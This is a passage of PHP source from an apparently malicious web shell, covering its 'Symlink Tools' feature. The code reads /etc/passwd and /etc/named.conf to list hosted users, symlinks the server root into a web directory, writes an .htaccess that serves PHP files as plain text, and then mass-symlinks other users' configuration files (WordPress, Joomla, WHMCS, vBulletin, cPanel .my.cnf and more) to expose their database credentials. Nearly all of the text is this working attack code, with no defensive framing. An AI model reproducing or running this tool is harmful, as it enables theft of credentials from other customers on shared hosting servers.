	echo "<br><br><br><br><br><br><br><br><div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
// Symlink Tools
elseif(isset($_GET['symlink_tools'])){
if($_GET['symlink_tools'] == 'symserver'){
?>
<center><h1 style="font-size:33px;">Server Symlinker</h1><br>
<?php
}elseif($_GET['symlink_tools'] == 'symconf') {
?>
<center><h1 style="font-size:33px;">Symlink Config</h1><br>
<?php
}elseif($_GET['symlink_tools'] == 'sym404') {
?>
<center><h1 style="font-size:33px;">Symlink 404</h1><br>
<?php
}elseif($_GET['symlink_tools'] == 'sympy') {
?>
<center><h1 style="font-size:33px;">Bypass Symlink Python</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">Symlink Tools</h1><br>
<?php
}
echo"
<br>
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?symlink_tools=symserver&dir=$dir'>Server Symlinker</a>
</li>
<li>
<a href='?symlink_tools=symconf&dir=$dir'>Symlink Config</a>
</li>
<li>
<a href='?symlink_tools=sym404&dir=$dir'>Symlink 404</a>
</li>
<li>
<a href='?symlink_tools=sympy&dir=$dir'>Bypass Symlink Python</a>
</li>
</ul>
</div>
</center>
<br><br>";
// Server Symlinker
if($_GET['symlink_tools'] == 'symserver'){
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("eca_sym",0777);
@chdir("eca_sym");
@exe("ln -s / root");
$file3 = "Options Indexes FollowSymLinks
DirectoryIndex eca.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br><center>
<table align=center border=1 style='width:60%;border-color:gray;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(preg_match("#zone#mi",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/eca_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td></tr>";
flush();
$dcount++;}}}
echo "</table></center>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("eca_sym",0777);
@chdir("eca_sym");
exe("ln -s / root");
$file3 = "Options Indexes FollowSymLinks
DirectoryIndex eca.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "<center>
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = [];
 $t = preg_match('//(.*?)://s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/eca_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table></center>";}else{
 if(!$win){@mkdir("eca_sym",0777);@chdir("eca_sym");
@exe("ln -s / root");
$file3 = "Options Indexes FollowSymLinks
DirectoryIndex eca.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "<center>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = [];
 $t = preg_match('//(.*?)://s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/eca_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";
 unlink("test.txt");
 } else{
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
}
}
// Symlink Config
elseif($_GET['symlink_tools'] == 'symconf'){
if($win){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !empty($_POST["passwd"])){
@mkdir("eca_symconf", 0777);
@chdir("eca_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex eca.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','eca_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
